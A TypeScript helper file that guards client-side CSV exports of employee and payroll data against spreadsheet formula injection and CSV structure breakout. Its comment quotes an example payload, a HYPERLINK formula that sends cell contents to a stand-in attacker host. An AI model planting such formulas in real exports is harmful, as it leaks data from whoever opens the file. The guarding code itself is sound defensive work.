/**
 * Shared CSV-safety helpers used at every client-side export site (the roster CSV in
 * services/api.ts, the Pareto roster/compliance CSV in components/paretoScenarios.ts,
 * and the client-side Gusto/ADP downloads in components/LaborAnalysisView.tsx).
 *
 * Two distinct risks live in the same cell:
 *  - Formula injection: a cell whose text starts with '=', '+', '-' or '@' is a live
 *    formula to Excel/Sheets/Numbers the moment the exported file is opened - a leading
 *    tab or carriage return can smuggle a second "cell" past naive parsers the same way.
 *    An employee name, role or facility name is free text someone chose, so it must
 *    never be able to run code or call out to a URL (e.g. a name of
 *    '=HYPERLINK("http://evil.example/"&A1,"click")') just because the export was opened.
 *  - CSV structure injection: a value containing a comma, quote or newline must be
 *    quoted with its internal quotes doubled (RFC 4180), or it can break out of its own
 *    cell and inject extra columns/rows - including, after a quote-breakout, a formula
 *    the guard above never saw because it only looked at the field's own first character.
 */

const FORMULA_TRIGGER_CHARS = ['=', '+', '-', '@', '\t', '\r'];

/** Prefixes a leading formula-trigger character with a single quote, which Excel/
 *  Sheets/Numbers treat as "force text" and never render, so the cell shows and stores
 *  as literal text instead of being evaluated. */
export function neutralizeCsvFormula(value: string): string {
  return FORMULA_TRIGGER_CHARS.some((c) => value.startsWith(c)) ? `'${value}` : value;
}

/** Formula-guards, then RFC-4180-quotes (doubling internal quotes) only when the value
 *  contains a comma, quote or newline. Safe for any free-text or numeric cell. */
export function csvSafeCell(value: string | number | boolean | null | undefined): string {
  if (value === null || value === undefined) return '';
  const raw = typeof value === 'string' ? value : String(value);
  const guarded = neutralizeCsvFormula(raw);
  return /[",\n\r]/.test(guarded) ? `"${guarded.replace(/"/g, '""')}"` : guarded;
}
